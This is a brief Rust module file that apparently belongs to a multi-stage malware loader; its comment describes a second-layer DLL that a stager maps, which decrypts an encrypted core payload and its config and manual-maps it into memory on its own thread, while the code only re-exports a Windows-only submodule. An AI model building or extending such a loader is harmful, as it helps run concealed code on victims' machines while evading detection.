// The fetched memory-loader (second layer). The stager maps this DLL and calls
// `run_image` with the still-encrypted core artifact and the stage token; here
// the core's sections are decrypted, the encrypted config at the DLL tail is
// recovered, and the image is manual-mapped and started on its own thread.
#[cfg(windows)]
mod imp;

#[cfg(windows)]
pub use imp::*;